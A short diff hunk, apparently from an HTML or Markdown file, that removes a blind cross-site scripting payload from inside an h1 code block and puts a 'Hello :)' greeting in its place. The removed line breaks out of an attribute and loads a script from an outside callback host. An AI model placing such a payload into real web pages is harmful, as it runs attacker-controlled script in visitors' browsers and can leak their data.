@@ -2,7 +2,7 @@
 <h1>
 
 ```
-"><script src=https://dawadi.bxss.in></script>
+Hello :) 
 ```
 </h1>
 <!-- START -->
